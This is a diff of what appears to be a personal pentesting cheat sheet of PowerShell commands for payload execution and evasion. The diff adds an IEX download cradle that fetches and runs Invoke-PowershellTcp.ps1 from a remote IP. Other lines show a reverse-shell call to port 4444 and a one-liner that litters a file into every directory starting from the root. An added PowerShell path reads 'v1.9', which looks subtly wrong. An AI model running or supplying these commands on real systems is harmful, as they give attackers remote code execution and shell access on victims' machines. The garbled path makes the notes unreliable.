@@ -9,18 +9,11 @@ https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051f
 
 
 
-
-
-
-
-
-
-
 - ---] Quick Commands
 =====================
 
-
-
+# Invoke Expressions (IEX)
+IEX(New-Object Net.WebClient).downloadString('http://192.168.119.232/Invoke-PowershellTcp.ps1')
 
 
 
@@ -29,10 +22,6 @@ https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051f
 
 # Can you write here?
 cd / ;Get-ChildItem -Recurse -Directory | ForEach-Object {New-Item -ItemType file -Path "$($_.FullName)" -Name "I CAN WRITE HERE!" }
-
-
-
-
 
 
 
@@ -46,6 +35,7 @@ cd / ;Get-ChildItem -Recurse -Directory | ForEach-Object {New-Item -ItemType fil
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 
 
+
 - ---] Notes
 ====================
 
@@ -56,3 +46,5 @@ C:\Windows\SysNative\
 C:\Windows\SysWow64
 C:\Windows\System32
 
+# Full path to x64-bit powershell
+C:\Windows\SysNative\WindowsPowershell\v1.9\Powershell.exe 
